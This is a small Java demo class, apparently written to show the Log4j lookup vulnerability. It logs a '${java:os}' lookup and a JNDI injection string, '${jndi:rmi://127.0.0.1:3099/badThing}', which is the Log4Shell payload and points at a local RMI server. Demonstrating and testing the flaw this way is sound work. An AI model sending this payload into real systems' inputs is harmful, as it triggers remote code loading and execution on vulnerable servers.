package com.example.demolog4j;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author: Monster
 * @date: 2019-07-12 09:28
 **/
public class LogTest {
	static Logger logger= LogManager.getLogger();

    public static void main(String[] args) {
    	String username="world";
		String vminfo="${java:os}";
    	System.out.println("hihi");
		logger.error("hello,{}!",username);
		logger.error("hello,{}!",vminfo);
		String badThing="${jndi:rmi://127.0.0.1:3099/badThing}";
		logger.error("hello,{}!",badThing);
    }

    public static void do2(){

    }
}
